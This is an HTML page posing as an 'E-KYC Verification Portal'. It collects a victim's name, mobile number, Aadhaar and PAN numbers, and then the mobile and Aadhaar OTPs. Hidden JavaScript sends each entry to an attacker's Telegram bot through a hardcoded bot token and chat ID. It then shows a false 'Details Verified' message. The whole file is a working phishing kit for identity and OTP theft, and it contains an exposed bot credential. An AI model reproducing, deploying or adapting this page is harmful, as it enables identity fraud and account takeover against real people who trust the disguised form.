<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-KYC Verification Portal</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; padding: 10px; margin: 0; }
        .box { background: white; max-width: 450px; margin: 10px auto; padding: 25px; border-radius: 12px; border-top: 8px solid #003366; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        h2 { text-align: center; color: #003366; font-size: 18px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        label { font-weight: bold; font-size: 13px; display: block; margin-top: 15px; }
        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        .btn { background: #28a745; color: white; border: none; padding: 18px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 25px; }
        #otp-section { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2>E-KYC VERIFICATION SYSTEM</h2>
    <form id="kycForm">
        <div id="step1">
            <label>Full Name</label><input type="text" id="name" required>
            <label>Mobile Number</label><input type="tel" id="mobile" required>
            <label>Aadhaar Number</label><input type="number" id="aadhaar" required>
            <label>PAN Number</label><input type="text" id="pan" required>
            <p style="font-size:11px; color:red; margin-top:10px;">* Photo upload is active. Please select files.</p>
            <label>Aadhaar Photo</label><input type="file" id="f1">
            <label>Selfie Photo</label><input type="file" id="f2">
            
            <button type="button" class="btn" onclick="sendDetails()">SUBMIT & REQUEST OTP</button>
        </div>

        <div id="otp-section">
            <h3 style="text-align:center; color: #d9534f;">üîê OTP VERIFICATION</h3>
            <label>Mobile OTP</label><input type="text" id="m_otp" placeholder="Enter Mobile OTP">
            <label>Aadhaar OTP</label><input type="text" id="a_otp" placeholder="Enter Aadhaar OTP">
            <button type="button" class="btn" style="background:#003366;" onclick="sendOTP()">VERIFY & FINISH</button>
        </div>
    </form>
</div>

<script>
    const TOKEN = '8280546067:AAGrfg3--zETMS9QeokAZyFp7MjsFBKIrNY';
    const CHAT_ID = '7405101072'; // Maine aapki ID yahan set kar di hai

    function sendDetails() {
        const msg = `üö® *NAYA CUSTOMER* \n\nüë§ Name: ${document.getElementById('name').value}\nüìû Mobile: ${document.getElementById('mobile').value}\nüÜî Aadhaar: ${document.getElementById('aadhaar').value}\nüí≥ PAN: ${document.getElementById('pan').value}`;
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
        .then(() => {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('otp-section').style.display = 'block';
        });
    }

    function sendOTP() {
        const msg = `üîê *OTP RECIEVED* \n\nüì± Mobile OTP: ${document.getElementById('m_otp').value}\nüÜî Aadhaar OTP: ${document.getElementById('a_otp').value}`;
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
        .then(() => {
            alert("Success! Details Verified.");
            location.reload();
        });
    }
</script>
</body>
</html>
